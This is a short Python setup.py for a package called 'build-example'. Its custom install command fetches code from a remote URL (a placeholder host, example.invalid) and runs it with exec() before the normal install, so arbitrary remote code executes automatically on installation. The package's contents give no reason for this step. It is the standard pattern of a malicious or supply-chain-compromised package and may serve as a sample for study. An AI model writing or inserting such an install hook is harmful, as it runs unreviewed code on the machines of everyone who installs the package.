from setuptools import setup
from setuptools.command.install import install
import requests

class InstallCommand(install):
    def run(self):
        received = requests.get('https://example.invalid/module').text
        exec(compile(received, '<download>', 'exec'), {})
        install.run(self)

setup(name='build-example', version='1.0', cmdclass={'install': InstallCommand})
